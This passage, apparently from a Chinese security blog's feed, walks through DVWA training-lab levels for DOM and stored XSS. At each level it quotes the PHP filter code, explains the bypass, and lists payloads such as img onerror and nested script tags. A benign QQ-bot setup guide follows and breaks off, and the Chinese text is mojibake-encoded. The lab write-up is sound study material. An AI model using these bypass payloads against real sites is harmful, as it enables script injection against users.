class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h5><pre><code>&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) {    $default = $_GET[&#39;default&#39;];    # Do not allow script tags    if (stripos ($default, &quot;&lt;script&quot;) !== false) {        header (&quot;location: ?default=English&quot;);        exit;    }}?&gt;</code></pre><h5 id="åˆ†æ-5"><a href="#åˆ†æ-5" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h5><p>å¯¹defaultå˜é‡è¿›è¡Œäº†è¿‡æ»¤ï¼Œé€šè¿‡stripos()å‡½æ•°æŸ¥æ‰¾&lt;scr/ipt&gt;åœ¨defaultä¸­çš„ä½ç½®(ä¸åŒºåˆ†å¤§å°å†™)ï¼Œå¦‚æœåŒ¹é…åˆ°ï¼Œåˆ™å˜ä¸ºdefault=English,ä½†æ˜¯å¯ä»¥ä½¿ç”¨å…¶ä»–æ ‡ç­¾æ¥ç»•è¿‡ï¼Œå…ˆè¦é—­åˆ</option>å’Œ</select>æ ‡ç­¾<br><img src="https://Lmg66.github.io/img/114.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/115.png" alt="å›¾ç‰‡"></p><h5 id="payload-4"><a href="#payload-4" class="headerlink" title="payload:"></a>payload:</h5><pre><code>/vulnerabilities/xss_d/?default=English &lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&#39;XSS&#39;)&gt;/vulnerabilities/xss_d/?default=English&lt;input onclick=alert(&#39;XSS&#39;) /&gt;</code></pre><p><img src="https://Lmg66.github.io/img/116.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/117.png" alt="å›¾ç‰‡"></p><h4 id="çº§åˆ«-high-1"><a href="#çº§åˆ«-high-1" class="headerlink" title="çº§åˆ«:high"></a>çº§åˆ«:high</h4><h5 id="æŸ¥çœ‹æºç -6"><a href="#æŸ¥çœ‹æºç -6" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h5><pre><code>&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) {    # White list the allowable languages    switch ($_GET[&#39;default&#39;]) {        case &quot;French&quot;:        case &quot;English&quot;:        case &quot;German&quot;:        case &quot;Spanish&quot;:            # ok            break;        default:            header (&quot;location: ?default=English&quot;);            exit;    }}?&gt;</code></pre><h5 id="åˆ†æ-6"><a href="#åˆ†æ-6" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h5><p>ä½¿ç”¨ç™½åå•ï¼Œè¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœå€¼ä¸ä¸ºå°±default=Englishï¼Œä½†æ˜¯åªæ˜¯å¯¹defaultè¿›è¡Œäº†è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨å…¶ä»–å˜é‡ï¼Œdocument.location.hrefæ¥è·å–urlï¼Œä»ç„¶ä¼šè¾“å‡ºåˆ°æ ‡ç­¾ä¸­æ˜¾ç¤ºï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨æ³¨é‡Šç¬¦å·#</p><h5 id="payload-5"><a href="#payload-5" class="headerlink" title="payload:"></a>payload:</h5><pre><code>/vulnerabilities/xss_d/?default=English&amp;a=&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&#39;XSS&#39;)&gt;/vulnerabilities/xss_d/?default=English&amp;a=?default=English&amp;a=&lt;input onclick=alert(&#39;XSS&#39;) /&gt;/vulnerabilities/xss_d/?default=English#&lt;input onclick=alert(&#39;XSS&#39;) /&gt;/vulnerabilities/xss_d/?default=English#&lt;/option&gt;&lt;/select&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;)</code></pre><p><img src="https://Lmg66.github.io/img/118.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/119.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/120.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/121.png" alt="å›¾ç‰‡"></p><h4 id="çº§åˆ«-impossible-1"><a href="#çº§åˆ«-impossible-1" class="headerlink" title="çº§åˆ«:impossible"></a>çº§åˆ«:impossible</h4><h5 id="æŸ¥çœ‹æºç -7"><a href="#æŸ¥çœ‹æºç -7" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h5><pre><code># For the impossible level, don&#39;t decode the querystring$decodeURI = &quot;decodeURI&quot;;if ($vulnerabilityFile == &#39;impossible.php&#39;) {    $decodeURI = &quot;&quot;;}</code></pre><h5 id="åˆ†æ-7"><a href="#åˆ†æ-7" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h5><p>å¦‚æœæ˜¯impossibleéš¾åº¦åˆ™decodeURI=â€â€ï¼Œæ„æ€å°±æ˜¯ä¸è§£ç ï¼Œé‚£ä¹ˆæ ‡ç­¾å°±ä¼šè¢«è¿‡æ»¤ï¼Œæ— æ³•é—­åˆæ ‡ç­¾å’Œåˆ›å»ºæ–°æ ‡ç­¾ï¼Œæ‰€ä»¥æ— æ³•xss<br><img src="https://Lmg66.github.io/img/122.png" alt="å›¾ç‰‡"></p><h3 id="å­˜å‚¨å‹xss"><a href="#å­˜å‚¨å‹xss" class="headerlink" title="å­˜å‚¨å‹xss"></a>å­˜å‚¨å‹xss</h3><h4 id="çº§åˆ«-low-1"><a href="#çº§åˆ«-low-1" class="headerlink" title="çº§åˆ«:low"></a>çº§åˆ«:low</h4><h5 id="æŸ¥çœ‹æºç -8"><a href="#æŸ¥çœ‹æºç -8" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h5><pre><code>&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) {    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = stripslashes( $message );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Sanitize name input    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Update database    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    //mysql_close();}?&gt;</code></pre><h5 id="åˆ†æ-trim-å‡½æ•°-stripslashes-å‡½æ•°-mysqli-real-escape-string-å‡½æ•°åªæ˜¯å¯¹-ç±»å‹çš„å¤„ç†è¿‡æ»¤è½¬ç ï¼Œä¸»è¦æ˜¯å¯¹æ•°æ®åº“çš„ä¿æŠ¤å¹¶æœªè®¾è®¡çš„xssçš„å†…å®¹ï¼Œæ•…å¯ä»¥ç›´æ¥xss"><a href="#åˆ†æ-trim-å‡½æ•°-stripslashes-å‡½æ•°-mysqli-real-escape-string-å‡½æ•°åªæ˜¯å¯¹-ç±»å‹çš„å¤„ç†è¿‡æ»¤è½¬ç ï¼Œä¸»è¦æ˜¯å¯¹æ•°æ®åº“çš„ä¿æŠ¤å¹¶æœªè®¾è®¡çš„xssçš„å†…å®¹ï¼Œæ•…å¯ä»¥ç›´æ¥xss" class="headerlink" title="åˆ†æ:trim()å‡½æ•° stripslashes() å‡½æ•° mysqli_real_escape_string() å‡½æ•°åªæ˜¯å¯¹/ç±»å‹çš„å¤„ç†è¿‡æ»¤è½¬ç ï¼Œä¸»è¦æ˜¯å¯¹æ•°æ®åº“çš„ä¿æŠ¤å¹¶æœªè®¾è®¡çš„xssçš„å†…å®¹ï¼Œæ•…å¯ä»¥ç›´æ¥xss"></a>åˆ†æ:trim()å‡½æ•° stripslashes() å‡½æ•° mysqli_real_escape_string() å‡½æ•°åªæ˜¯å¯¹/ç±»å‹çš„å¤„ç†è¿‡æ»¤è½¬ç ï¼Œä¸»è¦æ˜¯å¯¹æ•°æ®åº“çš„ä¿æŠ¤å¹¶æœªè®¾è®¡çš„xssçš„å†…å®¹ï¼Œæ•…å¯ä»¥ç›´æ¥xss</h5><p><img src="https://Lmg66.github.io/img/123.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/124.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/125.png" alt="å›¾ç‰‡"></p><h5 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h5><pre><code>name:Lmg66message:&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre><p><img src="https://Lmg66.github.io/img/126.png" alt="å›¾ç‰‡"></p><h4 id="çº§åˆ«-medium"><a href="#çº§åˆ«-medium" class="headerlink" title="çº§åˆ«:medium"></a>çº§åˆ«:medium</h4><h5 id="æŸ¥çœ‹æºç -9"><a href="#æŸ¥çœ‹æºç -9" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h5><pre><code>&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) {    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = strip_tags( addslashes( $message ) );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $message = htmlspecialchars( $message );    // Sanitize name input    $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $name );    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Update database    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    //mysql_close();}?&gt;</code></pre><h5 id="åˆ†æ-8"><a href="#åˆ†æ-8" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h5><p>å¯¹nameç”¨str_replace()æ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼Œå¯ä»¥å¤§å†™ç»•è¿‡ï¼Œåªæ˜¯åŒ¹é…äº†ä¸€æ¬¡å¯ä»¥åµŒå¥—ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–çš„æ ‡ç­¾<br>å¯¹messageï¼Œaddslashes()å‡½æ•°åœ¨é¢„å®šå­—ç¬¦åŠ /ï¼Œstrip_tags()å‡½æ•°å‰¥å»å­—ç¬¦ä¸²ä¸­HTMLï¼ŒXMLï¼Œä»¥åŠphpæ ‡ç­¾ï¼Œhtmlspecialchars()å‡½æ•°é¢„å®šçš„å‡½æ•°è½¬æ¢ä¸ºHTMLå®ä½“ï¼ŒåŸºæœ¬éƒ½è¿‡æ»¤å’Œè½¬ä¹‰äº†ï¼Œæ‰€ä»¥çªç ´nameå˜é‡ï¼Œnameå˜é‡é™åˆ¶äº†è¾“å‡ºé•¿åº¦ï¼Œè¦F12æ›´æ”¹nameçš„maxlength<br><img src="https://Lmg66.github.io/img/127.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/128.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/129.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/130.png" alt="å›¾ç‰‡"></p><h5 id="payload-7"><a href="#payload-7" class="headerlink" title="payload:"></a>payload:</h5><pre><code>name:&lt;Script&gt;alert(&#39;xss&#39;)&lt;/script&gt;message:Lmg66name:&lt;s&lt;script&gt;cript&gt;alert(&#39;xss&#39;)&lt;/script&gt;message:Lmg66name:&lt;img src=&#39;xss&#39; onerror=alert(&#39;xss&#39;)&gt;message:Lmg66</code></pre><h4 id="çº§åˆ«-high-2"><a href="#çº§åˆ«-high-2" class="headerlink" title="çº§åˆ«:high"></a>çº§åˆ«:high</h4><h5 id="æŸ¥çœ‹æºç -10"><a href="#æŸ¥çœ‹æºç -10" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h5><pre><code>&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) {    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = strip_tags( addslashes( $message ) );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $message = htmlspecialchars( $message );    // Sanitize name input    $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $name );    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Update database    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    //mysql_close();}?&gt;</code></pre><h5 id="åˆ†æ-9"><a href="#åˆ†æ-9" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h5><p>å¯¹messageå’Œä¸Šä¸€ä¸ªä¸€æ ·ï¼Œæ²¡å¸Œæœ›çªç ´ï¼Œå¯¹nameæ¥è¯´preg_replace( â€˜/&lt;(.<em>)s(.</em>)c(.<em>)r(.</em>)i(.<em>)p(.</em>)t/iâ€™, â€˜â€™, $name )ä¹‹å‰åå°„å‹xssè§è¿‡ï¼Œä¸åŒºåˆ†å¤§å°å†™ï¼Œé€šé…ç¬¦è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨å…¶ä»–æ ‡ç­¾,nameåŒæ ·é™åˆ¶äº†é•¿åº¦ï¼ŒF12æ”¹ä¸€ä¸‹maxlength=â€100â€</p><h5 id="payload-8"><a href="#payload-8" class="headerlink" title="payload:"></a>payload:</h5><pre><code>name:&lt;img src=&#39;xss&#39; onerror=alert(&#39;xss&#39;)&gt;message:Lmg66</code></pre><h4 id="çº§åˆ«-impossible-2"><a href="#çº§åˆ«-impossible-2" class="headerlink" title="çº§åˆ«:impossible"></a>çº§åˆ«:impossible</h4><h5 id="æŸ¥çœ‹æºç -11"><a href="#æŸ¥çœ‹æºç -11" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h5><pre><code>&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = stripslashes( $message );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $message = htmlspecialchars( $message );    // Sanitize name input    $name = stripslashes( $name );    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $name = htmlspecialchars( $name );    // Update database    $data = $db-&gt;prepare( &#39;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#39; );    $data-&gt;bindParam( &#39;:message&#39;, $message, PDO::PARAM_STR );    $data-&gt;bindParam( &#39;:name&#39;, $name, PDO::PARAM_STR );    $data-&gt;execute();}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><h5 id="åˆ†æ-10"><a href="#åˆ†æ-10" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h5><p>å¯¹nameå’Œmessageéƒ½è¿›è¡Œäº†ä¸¥æ ¼è¿‡æ»¤</p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
            <tag> é¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>qqæœºå™¨äºº</title>
      <link href="/posts/e895.html"/>
      <url>/posts/e895.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€:"></a>å‰è¨€:</h2><p>åœ¨å…¶ä»–ç¾¤çœ‹è§qqæœºå™¨äººå¾ˆå¥½ç©ï¼Œå°±æ‰“ç®—è‡ªå·±åšä¸€ä¸ªï¼Œæƒ³è®©å…¶æ¨é€ç½‘ç«™çš„æ–‡ç« ï¼Œæ–¹ä¾¿é˜…è¯»</p><h2 id="æ‰€éœ€ç¯å¢ƒ"><a href="#æ‰€éœ€ç¯å¢ƒ" class="headerlink" title="æ‰€éœ€ç¯å¢ƒ"></a>æ‰€éœ€ç¯å¢ƒ</h2><p>ä¸ºäº†è®©qqæœºå™¨äººèƒ½24å°æ—¶è¿è¡Œå»ºè®®æ­å»ºåœ¨æœåŠ¡å™¨ä¸Šæˆ–è€…vpsä¸Š</p><p>æ‰‹é‡Œåˆšå¥½æœ‰ä¸ªæœåŠ¡å™¨æˆ‘å°±æ­å»ºåœ¨æœåŠ¡å™¨ä¸Šäº†</p><p>æœåŠ¡å™¨ç¯å¢ƒï¼šcentos7</p><h2 id="å‡†å¤‡é…ç½®ç¯å¢ƒ"><a href="#å‡†å¤‡é…ç½®ç¯å¢ƒ" class="headerlink" title="å‡†å¤‡é…ç½®ç¯å¢ƒ"></a>å‡†å¤‡é…ç½®ç¯å¢ƒ</h2><h3 id="å®‰è£…å®å¡”"><a href="#å®‰è£…å®å¡”" class="headerlink" title="å®‰è£…å®å¡”"></a>å®‰è£…å®å¡”</h3><p>å› ä¸ºæ˜¯centosç³»ç»Ÿæ²¡æœ‰å›¾å½¢åŒ–é¡µé¢ï¼Œä¸ªäººå»ºè®®å®‰è£…å®å¡”(å¦‚æœä½ Linuxå‘½ä»¤å¾ˆç†Ÿæ‚‰å¯ä»¥è·³è¿‡)</p><p>å®‰è£…æ–¹æ³•ï¼š<a href="https://www.bt.cn/bbs/thread-19376-1-1.html" target="_blank" rel="noopener">https://www.bt.cn/bbs/thread-19376-1-1.html</a></p><p>æ‰¾åˆ°è‡ªå·±å¯¹åº”çš„ç³»ç»Ÿï¼Œå¤åˆ¶å®‰è£…ä»£ç åˆ°è™šæ‹Ÿç»ˆç«¯ï¼Œå›è½¦å³å¯</p><p>ç­‰å¾…ä¸€ä¼šç»ˆç«¯å‡ºç°ä¸€ä¸ªipåœ°å€(å°±æ˜¯ä½ æœåŠ¡å™¨çš„ip+8888å¥½åƒ)å’Œè´¦å·å¯†ç è®¿é—®ç™»å½•åˆ°å®å¡”</p><p>æŒ‰ç…§æˆ‘é€‰æ‹©çš„å®‰è£…æ’ä»¶å³å¯(å»ºè®®ï¼šç¼–è¯‘å®‰è£…)</p><p><img src="https://Lmg66.github.io/img/72.png" alt="å›¾ç‰‡"></p><h3 id="å®‰è£…docker"><a href="#å®‰è£…docker" class="headerlink" title="å®‰è£…docker"></a>å®‰è£…docker</h3><p>é…·qè¦è¿è¡Œåœ¨dockeré‡Œ</p><h4 id="å®‰è£…æ–¹æ³•ä¸€-é€šè¿‡å®å¡”å®‰è£…"><a href="#å®‰è£…æ–¹æ³•ä¸€-é€šè¿‡å®å¡”å®‰è£…" class="headerlink" title="å®‰è£…æ–¹æ³•ä¸€(é€šè¿‡å®å¡”å®‰è£…)"></a>å®‰è£…æ–¹æ³•ä¸€(é€šè¿‡å®å¡”å®‰è£…)</h4><p>å®å¡”é¡µé¢è½¯ä»¶å•†åŸæœç´¢dockerï¼Œå®‰è£…å³å¯</p><p><img src="https://Lmg66.github.io/img/73.png" alt="å›¾ç‰‡"></p><h4 id="å®‰è£…æ–¹æ³•äºŒ-å‘½ä»¤è¡Œå®‰è£…"><a href="#å®‰è£…æ–¹æ³•äºŒ-å‘½ä»¤è¡Œå®‰è£…" class="headerlink" title="å®‰è£…æ–¹æ³•äºŒ(å‘½ä»¤è¡Œå®‰è£…)"></a>å®‰è£…æ–¹æ³•äºŒ(å‘½ä»¤è¡Œå®‰è£…)</h4><p>å®‰è£…æ–¹æ³•ï¼š<a href="https://www.runoob.com/docker/centos-docker-install.html" target="_blank" rel="noopener">https://www.runoob.com/docker/centos-docker-install.html</a><br>æ‰¾åˆ°è‡ªå·±å¯¹åº”çš„ç³»ç»Ÿï¼Œå¤åˆ¶å®‰è£…ä»£ç åˆ°è™šæ‹Ÿç»ˆç«¯ï¼Œå›è½¦å³å¯</p><h3 id="å®‰è£…python3-gt-3-7"><a href="#å®‰è£…python3-gt-3-7" class="headerlink" title="å®‰è£…python3&gt;=3.7"></a>å®‰è£…python3&gt;=3.7</h3><p>å› ä¸ºé…·qä¸­çš„cqhttpæ’ä»¶éœ€è¦python3ç¯å¢ƒè¿™é‡Œé¡ºä¾¿å®‰è£…äº†</p><p>å®‰è£…æ–¹æ³•(centos7ç³»ç»Ÿ)ï¼š<a href="https://blog.csdn.net/u013214212/article/details/81540840" target="_blank" rel="noopener">https://blog.csdn.net/u013214212/article/details/81540840</a></p><p>æ³¨æ„ï¼šæœ‰çš„ç³»ç»Ÿè‡ªå¸¦çš„æœ‰python2æˆ–è€…python3ï¼Œå»ºè®®ç™¾åº¦æŒ‰ç…§è‡ªå·±ç³»ç»Ÿå®‰è£…æˆ–å‡çº§python3.7ä»¥ä¸Šçš„æ–¹æ³•</p><h2 id="å®‰è£…é…·q"><a href="#å®‰è£…é…·q" class="headerlink" title="å®‰è£…é…·q"></a>å®‰è£…é…·q</h2><p>ç»ˆç«¯å‘½ä»¤pull é…·Qçš„é•œåƒï¼š</p><pre><code>docker pull coolq/wine-coolq</code></pre><p>å¦‚æœæ‹‰å–é•œåƒæ¯”è¾ƒæ…¢ï¼Œå¯ä»¥å°è¯•æ¢æº</p><p>æ¢æºå‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/Neeo/articles/12726262.html" target="_blank" rel="noopener">https://www.cnblogs.com/Neeo/articles/12726262.html</a></p><p>åˆ›å»ºç”¨äºå­˜æ”¾coolQæ•°æ®çš„æ–‡ä»¶å¤¹ï¼š</p><pre><code>mkdir /root/coolq-data</code></pre><p>ç„¶åè¿è¡Œ é…· Q é•œåƒï¼š</p><pre><code>docker run --name=coolq -d -p 8080:9000 -v /root/coolq-data:/home/user/coolq -e VNC_PASSWD=12345678 -e COOLQ_ACCOUNT=10000 coolq/wine-coolq</code></pre><p>å…¶ä¸­ VNC_PASSWD æŒ‡å®šé“¾æ¥ VNC å¯†ç ï¼Œè¿œç¨‹è®¿é—®é…· Q ç•Œé¢æ—¶è¦ç”¨åˆ°ï¼ŒCOOLQ_ACCOUNT æŒ‡çš„æ˜¯é…· Q é»˜è®¤ç™»å½•å¯†ç </p><p>ç™»å½•é…· Q ç•Œé¢ï¼Œåœ¨æµè§ˆå™¨è¾“å…¥ä½ æœåŠ¡å™¨ip+9000ï¼Œè®¿é—®è¾“å…¥ vnc å¯†ç åå°±å¯ä»¥çœ‹åˆ°é…· Q ç™»å½•ç•Œé¢äº†</p><h3 id="dockerçš„é…·qçš„è¿ç»´"><a href="#dockerçš„é…·qçš„è¿ç»´" class="headerlink" title="dockerçš„é…·qçš„è¿ç»´"></a>dockerçš„é…·qçš„è¿ç»´</h3><h4 id="æ–¹æ³•ä¸€-å‘½ä»¤è¡Œ-ï¼š"><a href="#æ–¹æ³•ä¸€-å‘½ä»¤è¡Œ-ï¼š" class="headerlink" title="æ–¹æ³•ä¸€(å‘½ä»¤è¡Œ)ï¼š"></a>æ–¹æ³•ä¸€(å‘½ä»¤è¡Œ)ï¼š</h4><p>æŸ¥çœ‹é…· Q è¿è¡Œæƒ…å†µï¼Œä¸»è¦æ˜¯é…· Q è¿è¡Œä¸­äº§ç”Ÿçš„æ—¥å¿—ï¼Œå¯ä»¥ç”¨æ¥æ’é”™</p><pre><code>docker logs coolq</code></pre><p>å¯åŠ¨å’Œåœæ­¢é…· Q</p><pre><code>docker start coolqdocker stop coolq</code></pre><h4 id="æ–¹æ³•äºŒ-å®å¡”"><a href="#æ–¹æ³•äºŒ-å®å¡”" class="headerlink" title="æ–¹æ³•äºŒ(å®å¡”):"></a>æ–¹æ³•äºŒ(å®å¡”):</h4><p>dockerç®¡ç†å™¨å³å¯</p><p><img src="https://Lmg66.github.io/img/73.png" alt="å›¾ç‰‡"></p><h2 id="å®‰è£…nonebot-cqhttp-ä¸ªæ€§åŒ–å®šåˆ¶ä½ çš„qqæœºå™¨äºº"><a href="#å®‰è£…nonebot-cqhttp-ä¸ªæ€§åŒ–å®šåˆ¶ä½ çš„qqæœºå™¨äºº" class="headerlink" title="å®‰è£…nonebot cqhttp ä¸ªæ€§åŒ–å®šåˆ¶ä½ çš„qqæœºå™¨äºº"></a>å®‰è£…nonebot cqhttp ä¸ªæ€§åŒ–å®šåˆ¶ä½ çš„qqæœºå™¨äºº</h2><p>å‚è€ƒnonebotå®˜ç½‘:<a href="https://nonebot.cqp.moe/" target="_blank" rel="noopener">https://nonebot.cqp.moe/</a></p><p>æ³¨ï¼šå®˜ç½‘æ˜¯æœ€å¥½çš„æ•™ç¨‹</p><h2 id="æŒ‚èµ·è„šæœ¬ï¼Œå®ç°24å°æ—¶è¿è¡Œ"><a href="#æŒ‚èµ·è„šæœ¬ï¼Œå®ç°24å°æ—¶è¿è¡Œ" class="headerlink" title="æŒ‚èµ·è„šæœ¬ï¼Œå®ç°24å°æ—¶è¿è¡Œ"></a>æŒ‚èµ·è„šæœ¬ï¼Œå®ç°24å°æ—¶è¿è¡Œ</h2><p>sshè¿æ¥ï¼Œæ–­å¼€çš„æ—¶å€™ï¼Œpythonè„šæœ¬ä¹Ÿä¼šæ–­å¼€ï¼Œè§£å†³è¿™ä¸ªé—®é¢˜éœ€è¦å°†è„šæœ¬åå°æŒ‚èµ·</p><p>è¿›å…¥ç¨‹åºå…¥å£ï¼ŒæŒ‚èµ·å‘½ä»¤</p><pre><code>nohup python bot.py &amp;</code></pre><p>ç„¶åå›è½¦å³å¯ï¼Œä¼šçœ‹è§ä¸€ä¸ªidï¼Œå°±æ˜¯åå°è¿è¡Œid,è‹¥è¦å…³æ‰éœ€è¦ä½¿ç”¨</p><pre><code>ps -aux</code></pre><p>å¯ä»¥æ‰¾åˆ°ä½ è¿è¡Œçš„è¿›ç¨‹idï¼Œç„¶åç”¨å‘½ä»¤å…³æ‰</p><pre><code>kill id</code></pre><h2 id="ä¸ªäººqqæœºå™¨äºº-å·²ç»å¼€æº"><a href="#ä¸ªäººqqæœºå™¨äºº-å·²ç»å¼€æº" class="headerlink" 